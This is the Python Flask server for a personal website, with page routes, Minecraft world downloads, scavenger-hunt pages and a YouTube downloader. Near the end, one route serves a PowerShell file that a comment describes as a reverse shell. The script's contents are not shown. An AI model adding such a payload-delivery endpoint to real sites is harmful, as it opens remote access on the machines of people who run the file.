# basic flask server


from flask import Flask, redirect, request, jsonify, render_template, send_file, Response
import flask

import os
from pytube import YouTube

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/downloads')
def dodododo_downloads():
    return render_template("downloads.html")

@app.route('/skycity')
def skycity():
    return render_template("skycity.html")

@app.route('/portfolio')
def portfolio():
    return render_template("portfolio.html")

@app.route('/video_downloader')
def video_downloader():
    return render_template("video-downloader.html")

@app.route('/download_video', methods=["GET"])
def video_downloader_download_video():

    # extract link
    link = request.args.get('url')
    save_path = "./"
    download_filename = "temp_vid_download.mp4"

    try:

        print("downloading...")
        if os.path.exists("temp.mp4"):
            os.remove("temp.mp4")
        yt = YouTube(link)
        stream = yt.streams.get_highest_resolution()
        stream.download(filename="temp.mp4")
        print("Download completed successfully!")

        with open("temp.mp4", 'rb') as file:
            content = file.read()
            response = Response(content, headers={
                "Content-Disposition": "attachment; filename=video.mp4",
                "Content-Type": "video/mp4"
            })
            return response

    
    except Exception as e:
        # return f"An error occurred: {str(e)}"
        print("Download failed: ", e)
        return f"Download failed: {str(e)}", 400

    return send_file("temp.mp4")

@app.route('/github_redirect')
def github_redirect():
    return redirect("https://github.com/Thrasherop")

@app.route('/dodododo_download_all')
def dodododo_download_all():
    return send_file('misc/download_files/ALL-4-worlds.zip', as_attachment=True)



"""

World Download Links

"""
@app.route('/doodododo_download_disasterSMP')
def dodododo_download_disasterSMP():
    return send_file('misc/download_files/disasterSMPDirectory.zip', as_attachment=True)

@app.route('/doodododo_download_season_2-origins')
def dodododo_download_season_2_origins():
    return send_file('misc/download_files/dodododo_season_2-origins-.zip', as_attachment=True)

@app.route('/doodododo_download_skjafdkahesf')
def dodododo_download_skjafdkahesf():
    return send_file('misc\\download_files\\kjafdkahesfDirectory.zip', as_attachment=True)

@app.route('/doodododo_download_StillNotAmplified')
def dodododo_download_StillNotAmplified():
    return send_file('misc/download_files/StillNotAmplifiedDirectory.zip', as_attachment=True)

"""

Endpoints for scavenger hunt
"""

@app.route('/LoveTap/app-info')
def Lovetap_app_info():
    return send_file('templates/lovetap-general.html')

@app.route('/a')
def scavenger_hunt_first():
    return send_file('templates/scavenger_hunt1.html')

@app.route('/a/extension')
@app.route('/aextension')
@app.route('/extension')
def scavenger_hunt_extansion():
    return send_file("templates/scavenger_hunt_cheeseotruth.html")

@app.route("/a/curiosity")
@app.route("/acuriosity")
@app.route("/curiosity")
def scavanger_hunt_end():
    return send_file("templates/scavenger_hunt_end.html")

"""

Misc Endpoints

"""

@app.route('/file_download/ps1')
def file_download():
    # p.ps1 provides a reverse shell to fantasy server
    return send_file('misc/misc_files/p.ps1', as_attachment=True)


if __name__ == "__main__":
    app.run(debug=False, port=80, host='0.0.0.0', threaded=True)

